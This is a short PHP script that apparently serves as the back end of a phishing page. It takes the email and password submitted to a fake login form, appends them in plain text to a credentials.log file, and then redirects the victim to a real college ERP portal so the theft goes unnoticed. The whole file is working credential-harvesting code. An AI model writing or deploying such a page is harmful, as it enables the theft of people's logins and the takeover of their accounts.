<?php
    // Get POST data
    $email = $_POST['user'];
    $password = $_POST['pass'];

    // Log to file
    $file = fopen("LOGS/credentials.log", "a");
    fwrite($file, "Email: $email | Password: $password\n");
    fclose($file);

    // Optional: Redirect user to real site (e.g., Facebook)
    header("Location: https://erp.pict.edu");
    exit();
?>
